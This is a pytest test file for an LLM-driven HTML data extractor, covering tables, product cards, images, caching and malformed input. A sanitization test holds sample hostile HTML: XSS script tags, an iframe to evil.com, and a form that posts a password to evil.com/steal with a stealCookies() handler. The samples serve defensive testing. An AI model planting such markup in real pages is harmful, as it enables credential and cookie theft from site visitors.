"""
Tests for HTMLDataExtractor
"""

import asyncio
import pytest
import os

from defog.llm import HTMLDataExtractor, extract_html_data
from defog.llm.html_data_extractor import HTMLDataExtractionResult


# Sample HTML content for testing
SAMPLE_HTML = {
    "simple_table": """
    <html>
    <body>
        <h1>Product Inventory</h1>
        <table>
            <thead>
                <tr>
                    <th>Product Name</th>
                    <th>Price</th>
                    <th>Stock</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Widget A</td>
                    <td>$19.99</td>
                    <td>150</td>
                </tr>
                <tr>
                    <td>Widget B</td>
                    <td>$29.99</td>
                    <td>75</td>
                </tr>
                <tr>
                    <td>Widget C</td>
                    <td>$39.99</td>
                    <td>0</td>
                </tr>
            </tbody>
        </table>
    </body>
    </html>
    """,
    "product_cards": """
    <html>
    <body>
        <div class="products">
            <div class="product-card" data-product-id="1">
                <h3>Premium Widget</h3>
                <p class="price">$49.99</p>
                <p class="description">High-quality widget for professionals</p>
                <span class="in-stock">In Stock</span>
            </div>
            <div class="product-card" data-product-id="2">
                <h3>Standard Widget</h3>
                <p class="price">$29.99</p>
                <p class="description">Everyday widget for general use</p>
                <span class="out-of-stock">Out of Stock</span>
            </div>
            <div class="product-card" data-product-id="3">
                <h3>Budget Widget</h3>
                <p class="price">$19.99</p>
                <p class="description">Affordable widget for basic needs</p>
                <span class="in-stock">In Stock</span>
            </div>
        </div>
    </body>
    </html>
    """,
    "html_with_images": """
    <html>
    <body>
        <h1>Business Performance Dashboard</h1>
        
        <section class="charts">
            <h2>Electricity Generation by Source</h2>
            <img src="https://data.europa.eu/apps/data-visualisation-guide/A%20deep%20dive%20into%20bar%20charts%20047791ead2e848bdb3d0afcd1bf2bd4a/electricity-bars-karim.png" 
                 alt="Bar chart showing electricity generation by different sources">
            <p>Data shows renewable energy sources are increasing.</p>
        </section>
        
        <section class="tables">
            <h2>Product Inventory</h2>
            <table>
                <thead>
                    <tr>
                        <th>Product</th>
                        <th>Stock</th>
                        <th>Price</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Widget Pro</td>
                        <td>150</td>
                        <td>$99.99</td>
                    </tr>
                    <tr>
                        <td>Widget Lite</td>
                        <td>300</td>
                        <td>$49.99</td>
                    </tr>
                </tbody>
            </table>
        </section>
        
        <section class="data-visualization">
            <h2>Excel Data Table Example</h2>
            <img src="https://support.microsoft.com/images/en-us/3dd2b79b-9160-403d-9967-af893d17b580"
                 alt="Excel table showing financial data">
        </section>
    </body>
    </html>
    """,
    "mixed_content": """
    <html>
    <head>
        <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "Organization",
            "name": "Widget Corp",
            "foundingDate": "2020",
            "numberOfEmployees": 50
        }
        </script>
    </head>
    <body>
        <div class="company-info">
            <h1>Widget Corp</h1>
            <dl>
                <dt>Founded</dt>
                <dd>2020</dd>
                <dt>Employees</dt>
                <dd>50</dd>
                <dt>Revenue</dt>
                <dd>$5M</dd>
            </dl>
        </div>
        
        <h2>Team Members</h2>
        <ul class="team-list">
            <li data-role="CEO">
                <span class="name">John Doe</span>
                <span class="email">john@widgetcorp.com</span>
            </li>
            <li data-role="CTO">
                <span class="name">Jane Smith</span>
                <span class="email">jane@widgetcorp.com</span>
            </li>
            <li data-role="CFO">
                <span class="name">Bob Johnson</span>
                <span class="email">bob@widgetcorp.com</span>
            </li>
        </ul>
        
        <table class="quarterly-revenue">
            <caption>Quarterly Revenue (in thousands)</caption>
            <thead>
                <tr>
                    <th>Quarter</th>
                    <th>Revenue</th>
                    <th>Growth %</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Q1 2024</td>
                    <td>$1,200</td>
                    <td>15%</td>
                </tr>
                <tr>
                    <td>Q2 2024</td>
                    <td>$1,380</td>
                    <td>15%</td>
                </tr>
                <tr>
                    <td>Q3 2024</td>
                    <td>$1,587</td>
                    <td>15%</td>
                </tr>
            </tbody>
        </table>
    </body>
    </html>
    """,
}


class TestHTMLDataExtractorUnit:
    """Unit tests for HTMLDataExtractor"""

    def test_initialization(self):
        """Test extractor initialization with different configurations"""
        # Test with default settings
        extractor = HTMLDataExtractor()
        assert extractor.analysis_provider == "anthropic"
        assert extractor.analysis_model == "claude-sonnet-4-20250514"
        assert extractor.extraction_provider == "anthropic"
        assert extractor.extraction_model == "claude-sonnet-4-20250514"
        assert extractor.max_parallel_extractions == 5
        assert extractor.temperature == 0.0

        # Test with custom settings
        extractor = HTMLDataExtractor(
            analysis_provider="openai",
            analysis_model="gpt-4.1",
            extraction_provider="gemini",
            extraction_model="gemini-pro",
            max_parallel_extractions=3,
            temperature=0.5,
        )
        assert extractor.analysis_provider == "openai"
        assert extractor.analysis_model == "gpt-4.1"
        assert extractor.extraction_provider == "gemini"
        assert extractor.extraction_model == "gemini-pro"
        assert extractor.max_parallel_extractions == 3
        assert extractor.temperature == 0.5


@pytest.mark.asyncio
class TestHTMLDataExtractorE2E:
    """End-to-end tests for HTMLDataExtractor with real API calls

    Provider distribution across tests:
    - test_simple_table_extraction: Anthropic (claude-sonnet-4)
    - test_product_cards_extraction: OpenAI (gpt-4.1)
    - test_mixed_content_extraction: Gemini (gemini-2.5-pro)
    - test_datapoint_filtering: Mixed (Anthropic for analysis, OpenAI for extraction)
    - test_convenience_function: Gemini (gemini-2.5-pro)
    - test_error_handling: OpenAI (gpt-4.1)
    """

    async def test_simple_table_extraction(self):
        """Test extraction from a simple HTML table with Anthropic"""
        # Skip if no API key
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor(
            analysis_provider="anthropic",
            analysis_model="claude-sonnet-4-20250514",
            extraction_provider="anthropic",
            extraction_model="claude-sonnet-4-20250514",
        )

        result = await extractor.extract_all_data(SAMPLE_HTML["simple_table"])

        # Verify results
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.page_type in ["report", "inventory", "product_list", "table"]
        assert result.total_datapoints_identified > 0
        assert result.successful_extractions > 0
        assert result.total_cost_cents > 0

        # Verify extraction data
        for extraction in result.extraction_results:
            if extraction.success:
                assert extraction.extracted_data is not None
                # Check if it's a table format
                data = extraction.extracted_data
                if hasattr(data, "model_dump"):
                    data = data.model_dump()

                # Should have columns and data for table extraction
                if "columns" in data and "data" in data:
                    assert len(data["columns"]) > 0
                    assert len(data["data"]) > 0
                    # Should have extracted 3 products
                    if "product" in extraction.datapoint_name.lower():
                        assert len(data["data"]) == 3

    async def test_product_cards_extraction(self):
        """Test extraction from product cards (list format) with OpenAI"""
        # Skip if no API key
        if not os.getenv("OPENAI_API_KEY"):
            pytest.skip("OPENAI_API_KEY not set")

        extractor = HTMLDataExtractor(
            analysis_provider="openai",
            analysis_model="gpt-4.1",
            extraction_provider="openai",
            extraction_model="gpt-4.1",
        )

        result = await extractor.extract_all_data(SAMPLE_HTML["product_cards"])

        # Verify results
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.page_type in ["e-commerce", "product_list", "catalog"]
        assert result.total_datapoints_identified > 0
        assert result.successful_extractions > 0

        # Check extracted data
        dict_result = await extractor.extract_as_dict(SAMPLE_HTML["product_cards"])
        assert "data" in dict_result
        assert len(dict_result["data"]) > 0

        # Should identify product cards as a datapoint
        product_data_found = False
        for key, value in dict_result["data"].items():
            if "product" in key.lower():
                product_data_found = True
                # Should have extracted 3 products
                if "data" in value:
                    assert len(value["data"]) == 3
                elif "items" in value:
                    assert len(value["items"]) == 3

        assert product_data_found, "No product data was extracted"

    async def test_mixed_content_extraction(self):
        """Test extraction from mixed HTML content with Gemini"""
        # Skip if no API key
        if not os.getenv("GEMINI_API_KEY"):
            pytest.skip("GEMINI_API_KEY not set")

        extractor = HTMLDataExtractor(
            analysis_provider="gemini",
            analysis_model="gemini-2.5-pro",
            extraction_provider="gemini",
            extraction_model="gemini-2.5-pro",
        )

        # Focus on specific areas
        result = await extractor.extract_all_data(
            SAMPLE_HTML["mixed_content"],
            focus_areas=["company information", "team members", "revenue data"],
        )

        # Verify results
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.total_datapoints_identified >= 3  # At least 3 datapoints
        assert result.successful_extractions > 0

        # Extract as dictionary for easier verification
        dict_result = await extractor.extract_as_dict(SAMPLE_HTML["mixed_content"])

        for key, value in dict_result["data"].items():
            print(f"\nDatapoint '{key}':")
            print(f"  Type: {type(value)}")
            if isinstance(value, dict):
                print(f"  Keys: {list(value.keys())}")

        # Should have extracted multiple datapoints
        assert len(dict_result["data"]) >= 2

        # Check for specific data types
        datapoint_types = set()
        for key in dict_result["data"].keys():
            if "company" in key.lower() or "info" in key.lower():
                datapoint_types.add("company_info")
            elif "team" in key.lower() or "member" in key.lower():
                datapoint_types.add("team")
            elif "revenue" in key.lower() or "quarterly" in key.lower():
                datapoint_types.add("revenue")

        # Should have identified at least 2 different types of data
        assert len(datapoint_types) >= 2

    async def test_convenience_function(self):
        """Test the convenience function with Gemini"""
        # Skip if no API key
        if not os.getenv("GEMINI_API_KEY"):
            pytest.skip("GEMINI_API_KEY not set")

        result = await extract_html_data(
            SAMPLE_HTML["simple_table"],
            analysis_provider="gemini",
            analysis_model="gemini-2.5-pro",
            extraction_provider="gemini",
            extraction_model="gemini-2.5-pro",
            temperature=0.1,
        )

        assert isinstance(result, dict)
        assert "metadata" in result
        assert "data" in result
        assert len(result["data"]) > 0

    async def test_error_handling(self):
        """Test error handling with invalid HTML using OpenAI"""
        # Skip if no API key
        if not os.getenv("OPENAI_API_KEY"):
            pytest.skip("OPENAI_API_KEY not set")

        extractor = HTMLDataExtractor(
            analysis_provider="openai",
            analysis_model="gpt-4.1",
            extraction_provider="openai",
            extraction_model="gpt-4.1",
        )

        # Test with empty HTML
        result = await extractor.extract_all_data("")
        assert isinstance(result, HTMLDataExtractionResult)
        # Should still complete but might not find datapoints
        assert result.total_datapoints_identified >= 0

        # Test with invalid HTML structure
        invalid_html = "<html><body><table><tr><td>Broken</table>"
        result = await extractor.extract_all_data(invalid_html)
        assert isinstance(result, HTMLDataExtractionResult)
        # Should handle gracefully
        assert result.total_cost_cents >= 0


@pytest.mark.asyncio
class TestHTMLDataExtractorEdgeCases:
    """Edge case tests for HTMLDataExtractor"""

    async def test_empty_html(self):
        """Test extraction from empty HTML"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        # Test completely empty string
        result = await extractor.extract_all_data("")
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.total_datapoints_identified == 0
        assert result.successful_extractions == 0
        assert result.failed_extractions == 0

        # Test HTML with no content
        empty_html = "<html><body></body></html>"
        result = await extractor.extract_all_data(empty_html)
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.total_datapoints_identified == 0

    async def test_malformed_html(self):
        """Test extraction from malformed HTML"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        malformed_htmls = [
            # Unclosed tags
            "<html><body><table><tr><td>Data</table>",
            # Missing closing tags
            "<div><span>Text<div>More text</div>",
            # Nested tables with errors
            "<table><tr><td><table><tr>Nested</tr></td></tr></table>",
            # Mixed up tag order
            "<b><i>Bold italic</b></i>",
        ]

        for html in malformed_htmls:
            result = await extractor.extract_all_data(html)
            assert isinstance(result, HTMLDataExtractionResult)
            # Should handle gracefully without crashing

    async def test_large_html_document(self):
        """Test extraction from large HTML document"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        # Create HTML that exceeds size limit
        large_table = "<html><body><table>"
        for i in range(10000):
            large_table += f"<tr><td>Row {i}</td><td>Data {i}</td></tr>"
        large_table += "</table></body></html>"

        extractor = HTMLDataExtractor(max_html_size_mb=0.1)  # Set small limit

        with pytest.raises(ValueError) as exc_info:
            await extractor.extract_all_data(large_table)

        assert "exceeds maximum size limit" in str(exc_info.value)

    async def test_html_with_no_extractable_data(self):
        """Test HTML that contains no structured data"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        # HTML with only text and no structure
        text_only_html = """
        <html>
        <body>
            <p>This is just a paragraph of text with no structured data.</p>
            <p>Another paragraph here.</p>
            <div>Some more unstructured content.</div>
        </body>
        </html>
        """

        result = await extractor.extract_all_data(text_only_html)
        assert isinstance(result, HTMLDataExtractionResult)
        # Might identify some data or might not, but should complete
        assert result.total_cost_cents >= 0

    async def test_unicode_and_special_characters(self):
        """Test HTML with Unicode and special characters"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        unicode_html = """
        <html>
        <body>
            <table>
                <tr>
                    <th>Product</th>
                    <th>Price</th>
                    <th>Description</th>
                </tr>
                <tr>
                    <td>Café Widget™</td>
                    <td>€19.99</td>
                    <td>Spëcial chàracters: ñ, ü, ç, 中文, 日本語, 🎉</td>
                </tr>
                <tr>
                    <td>Premium Widget®</td>
                    <td>¥2999</td>
                    <td>математика & symbols: ∑∏∫ ≠ ≤ ≥</td>
                </tr>
            </table>
        </body>
        </html>
        """

        result = await extractor.extract_all_data(unicode_html)
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.successful_extractions > 0

        # Check that Unicode was preserved
        dict_result = await extractor.extract_as_dict(unicode_html)
        assert len(dict_result["data"]) > 0

    async def test_html_with_scripts_and_styles(self):
        """Test HTML with script tags and inline styles"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        html_with_scripts = """
        <html>
        <head>
            <style>
                .product { color: red; }
                table { border: 1px solid black; }
            </style>
            <script>
                console.log('This should be removed');
            </script>
            <script type="application/ld+json">
            {
                "@context": "https://schema.org",
                "@type": "Product",
                "name": "Test Product",
                "price": "29.99"
            }
            </script>
        </head>
        <body>
            <table style="width: 100%; margin: 10px;">
                <tr style="background: #ccc;">
                    <td style="padding: 5px;">Product A</td>
                    <td style="font-weight: bold;">$19.99</td>
                </tr>
            </table>
            <script>alert('XSS attempt');</script>
        </body>
        </html>
        """

        result = await extractor.extract_all_data(html_with_scripts)
        assert isinstance(result, HTMLDataExtractionResult)
        # Should extract data while handling scripts safely

    async def test_caching_functionality(self):
        """Test that caching works correctly"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor(enable_caching=True)

        html = SAMPLE_HTML["simple_table"]

        # First extraction
        result1 = await extractor.extract_all_data(html)
        cost1 = result1.total_cost_cents

        # Second extraction (should use cache)
        result2 = await extractor.extract_all_data(html)
        cost2 = result2.total_cost_cents

        # Results should be the same
        assert result1.html_content_hash == result2.html_content_hash
        assert (
            result1.total_datapoints_identified == result2.total_datapoints_identified
        )

        # Second call should be from cache (same total cost)
        assert cost2 == cost1

    async def test_security_sanitization(self):
        """Test that HTML sanitization removes dangerous content"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        dangerous_html = """
        <html>
        <body>
            <table>
                <tr>
                    <td>Safe Data</td>
                    <td><script>alert('XSS')</script>Injected</td>
                </tr>
            </table>
            <iframe src="http://evil.com"></iframe>
            <object data="malware.exe"></object>
            <embed src="virus.swf">
            <form action="http://evil.com/steal">
                <input name="password" type="password">
            </form>
            <a href="javascript:void(0)" onclick="stealCookies()">Click me</a>
        </body>
        </html>
        """

        result = await extractor.extract_all_data(dangerous_html)
        assert isinstance(result, HTMLDataExtractionResult)
        # Should complete successfully with sanitized content

    async def test_deeply_nested_structures(self):
        """Test extraction from deeply nested HTML structures"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor()

        nested_html = """
        <html>
        <body>
            <div class="container">
                <div class="row">
                    <div class="col">
                        <div class="card">
                            <div class="card-body">
                                <div class="product-info">
                                    <span class="name">Product A</span>
                                    <span class="price">$19.99</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col">
                        <div class="card">
                            <div class="card-body">
                                <div class="product-info">
                                    <span class="name">Product B</span>
                                    <span class="price">$29.99</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </body>
        </html>
        """

        result = await extractor.extract_all_data(nested_html)
        assert isinstance(result, HTMLDataExtractionResult)
        # Should identify nested product data
        assert result.total_datapoints_identified > 0


@pytest.mark.asyncio
class TestHTMLDataExtractorWithImages:
    """Tests for HTML data extraction with image support"""

    async def test_image_extraction_enabled(self):
        """Test extraction from HTML containing images"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor(
            enable_image_extraction=True,
            analysis_provider="anthropic",
            analysis_model="claude-sonnet-4-20250514",
            extraction_provider="anthropic",
            extraction_model="claude-sonnet-4-20250514",
        )

        # Analyze HTML with images
        analysis, _ = await extractor.analyze_html_structure(
            SAMPLE_HTML["html_with_images"]
        )

        # Check that images were identified as data sources
        image_datapoints = [
            dp for dp in analysis.identified_datapoints if dp.data_type == "image"
        ]
        assert len(image_datapoints) > 0, "No image datapoints identified"

        # Also check that regular data was identified
        table_datapoints = [
            dp for dp in analysis.identified_datapoints if dp.data_type == "table"
        ]
        assert len(table_datapoints) > 0, "No table datapoints identified"

    async def test_image_extraction_disabled(self):
        """Test that image extraction can be disabled"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor(
            enable_image_extraction=False,
            analysis_provider="anthropic",
            analysis_model="claude-sonnet-4-20250514",
        )

        # Analyze HTML with images
        analysis, _ = await extractor.analyze_html_structure(
            SAMPLE_HTML["html_with_images"]
        )

        # Check that images were NOT identified as data sources
        image_datapoints = [
            dp for dp in analysis.identified_datapoints if dp.data_type == "image"
        ]
        assert len(image_datapoints) == 0, "Images identified when extraction disabled"

    async def test_mixed_html_and_image_extraction(self):
        """Test full extraction from HTML with both tables and images"""
        if not os.getenv("OPENAI_API_KEY"):
            pytest.skip("OPENAI_API_KEY not set")

        extractor = HTMLDataExtractor(
            enable_image_extraction=True,
            analysis_provider="openai",
            analysis_model="gpt-4.1",
            extraction_provider="openai",
            extraction_model="gpt-4.1",
            max_parallel_extractions=3,
        )

        # Extract all data
        result = await extractor.extract_all_data(SAMPLE_HTML["html_with_images"])

        # Verify results
        assert isinstance(result, HTMLDataExtractionResult)
        assert result.total_datapoints_identified > 0

        # Check we have both successful and potentially failed extractions
        # (image extractions might fail due to network issues)
        assert result.successful_extractions + result.failed_extractions == len(
            result.extraction_results
        )

        for extraction in result.extraction_results:
            if extraction.success:
                print(f"  ✓ {extraction.datapoint_name}")
            else:
                print(f"  ✗ {extraction.datapoint_name}: {extraction.error}")

    async def test_image_url_extraction(self):
        """Test the image URL extraction helper method"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor(enable_image_extraction=True)

        # Test URL extraction
        image_urls = extractor._extract_image_urls(SAMPLE_HTML["html_with_images"])

        # Should find 2 images
        assert len(image_urls) == 2

        # Check that URLs are correctly extracted
        expected_urls = [
            "https://data.europa.eu/apps/data-visualisation-guide/A%20deep%20dive%20into%20bar%20charts%20047791ead2e848bdb3d0afcd1bf2bd4a/electricity-bars-karim.png",
            "https://support.microsoft.com/images/en-us/3dd2b79b-9160-403d-9967-af893d17b580",
        ]

        for url in expected_urls:
            assert url in image_urls
            assert image_urls[url]["url"] == url
            assert "context" in image_urls[url]
            assert "element" in image_urls[url]

    async def test_relative_url_resolution(self):
        """Test that relative image URLs are resolved correctly"""
        if not os.getenv("ANTHROPIC_API_KEY"):
            pytest.skip("ANTHROPIC_API_KEY not set")

        extractor = HTMLDataExtractor(enable_image_extraction=True)

        # HTML with relative image URLs
        html_with_relative_urls = """
        <html>
        <body>
            <img src="/images/chart1.png" alt="Chart 1">
            <img src="./images/chart2.png" alt="Chart 2">
            <img src="../data/chart3.png" alt="Chart 3">
            <img src="https://example.com/absolute-chart.png" alt="Absolute URL">
        </body>
        </html>
        """

        base_url = "https://example.com/reports/2024/"

        # Test URL extraction with base_url
        image_urls = extractor._extract_image_urls(html_with_relative_urls, base_url)

        # Check that relative URLs are resolved correctly
        assert (
            image_urls["/images/chart1.png"]["url"]
            == "https://example.com/images/chart1.png"
        )
        assert (
            image_urls["./images/chart2.png"]["url"]
            == "https://example.com/reports/2024/images/chart2.png"
        )
        assert (
            image_urls["../data/chart3.png"]["url"]
            == "https://example.com/reports/data/chart3.png"
        )

        # Absolute URLs should remain unchanged
        assert (
            image_urls["https://example.com/absolute-chart.png"]["url"]
            == "https://example.com/absolute-chart.png"
        )


if __name__ == "__main__":
    # Run a simple test
    async def main():
        extractor = HTMLDataExtractor()
        result = await extractor.extract_as_dict(SAMPLE_HTML["simple_table"])
        print("Extraction Result:")
        print(f"Page Type: {result['metadata']['page_type']}")
        print(f"Extracted {len(result['data'])} datapoints")
        for name, data in result["data"].items():
            print(f"\n{name}:")
            print(data)

    asyncio.run(main())
